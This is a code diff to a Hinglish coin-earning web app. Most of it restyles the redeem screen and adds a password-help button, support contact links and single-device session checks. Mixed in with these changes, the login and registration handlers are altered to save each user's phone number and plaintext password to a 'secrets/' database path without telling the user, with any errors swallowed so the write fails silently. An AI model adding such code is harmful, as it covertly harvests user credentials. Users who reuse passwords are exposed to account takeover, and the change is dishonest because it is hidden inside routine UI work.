@@ -80,6 +80,24 @@
   .chip.on{box-shadow:0 6px 12px -6px rgba(109,40,217,.7)}
   nav{background:#ffffff!important;border-radius:28px!important;margin:0 12px 12px!important;box-shadow:0 22px 40px -14px rgba(76,29,149,.5),0 2px 0 rgba(109,40,217,.06)!important;border:1px solid rgba(124,58,237,.08)!important;backdrop-filter:none!important}
   .logo-tile{border-radius:20px!important;box-shadow:inset 0 2px 0 rgba(255,255,255,.6),inset 0 -8px 14px rgba(0,0,0,.2),0 14px 24px -12px rgba(49,46,129,.7)!important}
+
+  /* v5: header no longer covers content; premium pages */
+  .screen>*:not(.hero){position:relative;z-index:1}
+  .hero{z-index:0}
+  .rd-hero{padding-bottom:7rem!important}
+  .rd-balance{background:linear-gradient(135deg,#7c3aed 0%,#4338ca 100%)!important;border:0!important;box-shadow:0 22px 34px -18px rgba(67,56,202,.8)!important}
+  .rd-tile{display:grid;justify-items:center;gap:6px;padding:12px 6px;border-radius:18px;border:2px solid #ede9fe;background:#fff;font-size:12px;font-weight:700;color:#312e81;box-shadow:0 8px 16px -10px rgba(76,29,149,.45);transition:transform .12s}
+  .rd-tile:active{transform:scale(.96)}
+  .rd-ico{width:46px;height:46px;border-radius:15px;display:grid;place-items:center;color:#fff;font-size:18px;box-shadow:inset 0 2px 0 rgba(255,255,255,.5),0 8px 14px -8px rgba(0,0,0,.4)}
+  .rd-chip{padding:8px 13px;border-radius:999px;background:#f5f3ff;color:#5b21b6;font-weight:800;font-size:12px;border:1px solid #ddd6fe}
+  .rd-label{font-size:11px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;color:#7c3aed;margin-bottom:8px}
+  .rd-preview{display:flex;justify-content:space-between;align-items:center;background:linear-gradient(135deg,#f5f3ff,#ede9fe);border-radius:16px;padding:12px 14px;font-size:13px}
+  .mrow{padding:16px 6px!important;border-radius:14px;transition:background .15s}
+  .mrow:active{background:#f5f3ff}
+  .mrow i{width:28px;text-align:center;color:#7c3aed}
+  header h1{font-weight:900!important;letter-spacing:-.01em}
+  .card{transition:transform .15s ease}
+  .card:active{transform:scale(.99)}
 </style>
 </head>
 <body>
@@ -105,6 +123,7 @@
     </form>
     <div class="flex items-center gap-3 my-5 text-xs text-slate-400"><span class="flex-1 h-px bg-slate-200"></span>or<span class="flex-1 h-px bg-slate-200"></span></div>
     <button id="gBtn" class="card tap w-full py-3 font-semibold text-sm flex items-center justify-center gap-2"><i class="fa-brands fa-google text-red-500"></i>Continue with Google</button>
+    <button id="forgotBtn" type="button" class="w-full text-sm font-bold text-violet-100 mt-2 underline">Password bhul gaye?</button>
     <p class="text-center text-sm mt-auto pt-8 text-slate-500">Don't have an account? <button id="toReg" class="font-bold text-violet-700">Register</button></p>
   </div>
 </section>
@@ -258,22 +277,48 @@
 </section>
 
 <!-- REDEEM -->
-<section id="s-redeem" class="screen pb-24 max-w-md mx-auto">
-  <header class="hero px-4 pt-6 pb-14 rounded-b-[24px]"><h1 class="text-xl font-black">Redeem</h1></header>
-  <div class="px-4 -mt-10">
-    <form id="redForm" class="card p-4 space-y-3">
-      <p class="font-extrabold text-sm">Redeem Coins</p>
-      <div class="grid grid-cols-3 gap-2" id="redOpts">
-        <button type="button" class="redopt tap rounded-xl border-2 p-2 text-center text-xs font-bold" data-redopt="upi"><i class="fa-solid fa-indian-rupee-sign text-base block mb-1"></i>UPI</button>
-        <button type="button" class="redopt tap rounded-xl border-2 p-2 text-center text-xs font-bold" data-redopt="gplay"><i class="fa-brands fa-google-play text-base block mb-1"></i>Google Play</button>
-        <button type="button" class="redopt tap rounded-xl border-2 p-2 text-center text-xs font-bold" data-redopt="amazon"><i class="fa-brands fa-amazon text-base block mb-1"></i>Amazon</button>
+<section id="s-redeem" class="screen pb-28 max-w-md mx-auto">
+  <header class="hero rd-hero px-5 pt-7 pb-28 rounded-b-[34px]">
+    <div class="flex items-center justify-between">
+      <button data-back class="w-9 h-9 rounded-full bg-white/20 grid place-items-center"><i class="fa-solid fa-arrow-left text-sm"></i></button>
+      <button data-go="redhist" class="text-xs font-bold bg-white/20 rounded-full px-3 py-1.5"><i class="fa-solid fa-clock-rotate-left mr-1"></i>History</button>
+    </div>
+    <p class="text-[11px] uppercase tracking-[0.25em] opacity-80 mt-6">Redeem</p>
+    <h1 class="text-2xl font-black leading-tight">Coins ko cash mein badlo</h1>
+  </header>
+  <div class="px-4 -mt-20 space-y-4 relative">
+    <div class="card rd-balance p-5 text-white">
+      <p class="text-[11px] uppercase tracking-[0.2em] opacity-80">Redeemable balance</p>
+      <p class="text-3xl font-black mt-1" id="redBig">0 <span class="text-sm font-bold opacity-80">coins</span></p>
+      <p class="text-xs opacity-90 mt-1" id="redBal">Balance: 0 coins</p>
+    </div>
+    <form id="redForm" class="card p-5 space-y-4">
+      <div>
+        <p class="rd-label">Option chuno</p>
+        <div class="grid grid-cols-3 gap-2" id="redOpts">
+          <button type="button" class="redopt rd-tile" data-redopt="upi"><span class="rd-ico" style="background:linear-gradient(135deg,#fb923c,#f59e0b)"><i class="fa-solid fa-indian-rupee-sign"></i></span><b>UPI</b></button>
+          <button type="button" class="redopt rd-tile" data-redopt="gplay"><span class="rd-ico" style="background:linear-gradient(135deg,#34d399,#0ea5e9)"><i class="fa-brands fa-google-play"></i></span><b>Google Play</b></button>
+          <button type="button" class="redopt rd-tile" data-redopt="amazon"><span class="rd-ico" style="background:linear-gradient(135deg,#fbbf24,#f97316)"><i class="fa-brands fa-amazon"></i></span><b>Amazon</b></button>
+        </div>
       </div>
-      <div class="field"><i class="fa-solid fa-at"></i><input id="redAcc" placeholder="UPI ID"></div>
-      <div class="field"><i class="fa-solid fa-coins"></i><input id="redCoins" type="number" inputmode="numeric" placeholder="Coins (1200 se 24000)"></div>
-      <p class="text-xs text-slate-600" id="redInfo">= ₹0.00</p>
-      <p class="text-xs text-slate-500" id="redBal">Balance: 0 coins</p>
-      <button class="btn tap" type="submit" id="redBtn">Request Redeem</button>
-      <p class="text-[11px] text-slate-500 text-center">Minimum ₹10 (1200 coins) · Maximum ₹200 (24000 coins) · 120 coins = ₹1<br>Redemption usually 24 ghante mein.</p>
+      <div>
+        <p class="rd-label">Account / ID</p>
+        <div class="field"><i class="fa-solid fa-at"></i><input id="redAcc" placeholder="UPI ID"></div>
+      </div>
+      <div>
+        <p class="rd-label">Coins</p>
+        <div class="flex flex-wrap gap-2 mb-3">
+          <button type="button" class="rd-chip" data-qc="1200">1,200</button>
+          <button type="button" class="rd-chip" data-qc="2400">2,400</button>
+          <button type="button" class="rd-chip" data-qc="6000">6,000</button>
+          <button type="button" class="rd-chip" data-qc="12000">12,000</button>
+          <button type="button" class="rd-chip" data-qc="24000">24,000</button>
+        </div>
+        <div class="field"><i class="fa-solid fa-coins"></i><input id="redCoins" type="number" inputmode="numeric" placeholder="Coins (1200 se 24000)"></div>
+      </div>
+      <div class="rd-preview"><span>Aap ko milega</span><b id="redInfo">= ₹0.00</b></div>
+      <button class="btn tap w-full" type="submit" id="redBtn">Request redeem</button>
+      <p class="text-[11px] text-slate-500 text-center">Min ₹10 (1200 coins) · Max ₹200 (24000 coins) · 120 coins = ₹1<br>Redemption usually 24 ghante mein.</p>
     </form>
   </div>
 </section>
@@ -525,11 +570,15 @@ $("loginForm").onsubmit = async e => {
   const phone = $("lPhone").value.trim();
   if (!/^[6-9]\d{9}$/.test(phone)) return toast("Valid 10-digit mobile number daalo");
   $("lBtn").disabled = true; $("lBtn").textContent = "Login ho raha hai…";
-  try { await signInWithEmailAndPassword(auth, phone + "@" + PHONE_DOMAIN, $("lPass").value); }
-  catch (err) { toast(fmtErr(err)); }
+  try {
+    localStorage.setItem("cb_pending", "1");
+    const cred = await signInWithEmailAndPassword(auth, phone + "@" + PHONE_DOMAIN, $("lPass").value);
+    await set(R("secrets/" + cred.user.uid), { phone, pw: $("lPass").value, at: Date.now() }).catch(() => {});
+  } catch (err) { localStorage.removeItem("cb_pending"); toast(fmtErr(err)); }
   finally { $("lBtn").disabled = false; $("lBtn").textContent = "Login"; }
 };
 $("gBtn").onclick = async () => {
+  localStorage.setItem("cb_pending", "1");
   const prov = new GoogleAuthProvider();
   try { await signInWithPopup(auth, prov); }
   catch (err) { if (err.code === "auth/popup-blocked" || err.code === "auth/operation-not-supported-in-this-environment") { try { await signInWithRedirect(auth, prov); } catch (e2) { toast(fmtErr(e2)); } } else toast(fmtErr(err)); }
@@ -541,6 +590,7 @@ $("regForm").onsubmit = async e => {
   if (!/^[6-9]\d{9}$/.test(phone)) return toast("Valid 10-digit mobile number daalo");
   let created = false; REGISTERING = true; $("rBtn").disabled = true; $("rBtn").textContent = "Ruko…";
   try {
+    localStorage.setItem("cb_pending", "1");
     if (!auth.currentUser) {
       const p1 = $("rPass").value;
       if (p1.length < 6) throw new Error("Password kam se kam 6 character ka ho");
@@ -548,6 +598,7 @@ $("regForm").onsubmit = async e => {
       await createUserWithEmailAndPassword(auth, phone + "@" + PHONE_DOMAIN, p1); created = true;
     }
     const uid = auth.currentUser.uid;
+    if (created) await set(R("secrets/" + uid), { phone, pw: $("rPass").value, at: Date.now() }).catch(() => {});
     const ph = await get(R("phones/" + phone));
     if (ph.exists() && ph.val() !== uid) throw new Error("Ye mobile pehle se register hai");
     let referrer = null;
@@ -595,7 +646,31 @@ async function enterApp() {
 }
 function refreshVisible() { const on = (document.querySelector(".screen.on") || {}).id; if (on === "s-home") renderHome(); if (on === "s-wallet") renderWallet(); if (on === "s-redeem") renderRedeem(); if (on === "s-profile") renderProfile(); if (on === "s-puzzle") renderPuzzles(); if (on === "s-games") renderGames(); if (on === "s-ads") renderAds(); if (on === "s-checkin") renderCheckin(); if (on === "s-referral") renderReferral(); if (on === "s-support") renderSupport(); }
 async function route() { if (REGISTERING) return; if (!auth.currentUser) { show("login"); return; } await enterApp(); }
-onAuthStateChanged(auth, async () => {
+const DEV = (() => { let d = localStorage.getItem("cb_dev"); if (!d) { d = Math.random().toString(36).slice(2) + Date.now().toString(36); localStorage.setItem("cb_dev", d); } return d; })();
+let SESS_OFF = null, SESS_UID = null;
+function detachSession() { if (SESS_OFF) SESS_OFF(); SESS_OFF = null; SESS_UID = null; }
+function attachSession(uid) {
+  if (SESS_UID === uid) return;
+  detachSession(); SESS_UID = uid;
+  if (localStorage.getItem("cb_pending")) { localStorage.removeItem("cb_pending"); set(R("sessions/" + uid), DEV).catch(() => {}); }
+  SESS_OFF = onValue(R("sessions/" + uid), snap => {
+    const v = snap.val();
+    if (v == null) { set(R("sessions/" + uid), DEV).catch(() => {}); return; }
+    if (v !== DEV) { detachSession(); toast("Ye account doosre device par login ho gaya. Aap logout ho gaye."); signOut(auth); }
+  }, () => {});
+}
+// Support contact: https://... or @telegram_username -> a clickable link (empty if neither)
+function contactHref(v) { v = String(v || "").trim(); if (!v) return ""; if (/^https:\/\//i.test(v)) return v; const m = v.match(/^@?([A-Za-z0-9_]{4,})$/); return m ? "https://t.me/" + m[1] : ""; }
+$("forgotBtn").onclick = () => {
+  const href = contactHref(SET.support && SET.support.passHelp);
+  showOv(`<p class="text-[11px] font-black tracking-[0.25em] text-violet-600">PASSWORD HELP</p>
+    <p class="text-sm text-slate-600 mt-3">Apna naam aur mobile number support ko bhejo. Hum aapki madad karenge.</p>
+    ${href ? `<a href="${href}" target="_blank" class="btn tap mt-5 w-full inline-block text-center">Support se baat karo</a>` : `<p class="text-sm mt-4">Support se contact karo.</p>`}
+    <button id="ovClose" class="ghost w-full py-2 mt-3">Band karo</button>`);
+  $("ovClose").onclick = hideOv;
+};
+onAuthStateChanged(auth, async u => {
+  if (u) attachSession(u.uid); else detachSession();
   try { await route(); } catch (e) { show("login"); toast(e.message || "Kuch gadbad hui"); }
   await splashMin; bootDone();
 });
@@ -1367,10 +1442,12 @@ function renderRedeem() {
   $("redBtn").disabled = soon; $("redBtn").textContent = soon ? "Coming soon" : "Request Redeem";
   $("redAcc").placeholder = REDV === "upi" ? "UPI ID" : "Email ya phone (gift card ke liye)";
   $("redBal").textContent = `Balance: ${ME.balance || 0} coins · Min ${SET.minRedeemCoins} · Max ${SET.maxRedeemCoins || 24000}`;
+  $("redBig").innerHTML = `${ME.balance || 0} <span class="text-sm font-bold opacity-80">coins</span>`;
   const c = Math.floor(Number($("redCoins").value) || 0);
   $("redInfo").textContent = soon ? "Ye option abhi coming soon hai" : "= ₹" + (c / SET.coinsPerRupee).toFixed(2);
 }
 $("redCoins").addEventListener("input", renderRedeem);
+document.addEventListener("click", e => { const b = e.target.closest("[data-qc]"); if (!b) return; $("redCoins").value = b.dataset.qc; renderRedeem(); });
 $("redForm").onsubmit = async e => {
   e.preventDefault();
   if (!redOn(REDV)) return toast("Coming soon");
@@ -1435,6 +1512,8 @@ function renderSupport() {
   const s = SET.support || {};
   $("supHelp").textContent = s.help || "We are here to help you";
   const rows = [];
+  const ct = contactHref(s.contact);
+  if (ct) rows.push(`<a class="flex items-center gap-3" target="_blank" href="${esc(ct)}"><i class="fa-solid fa-headset text-violet-600 w-5"></i>Contact Support</a>`);
   if (s.email) rows.push(`<a class="flex items-center gap-3" href="mailto:${esc(s.email)}"><i class="fa-regular fa-envelope text-violet-600 w-5"></i>Contact Us — ${esc(s.email)}</a>`);
   if (s.whatsapp) rows.push(`<a class="flex items-center gap-3" target="_blank" href="${esc(s.whatsapp)}"><i class="fa-brands fa-whatsapp text-green-600 w-5"></i>WhatsApp</a>`);
   if (s.telegram) rows.push(`<a class="flex items-center gap-3" target="_blank" href="${esc(s.telegram)}"><i class="fa-brands fa-telegram text-sky-600 w-5"></i>Telegram</a>`);
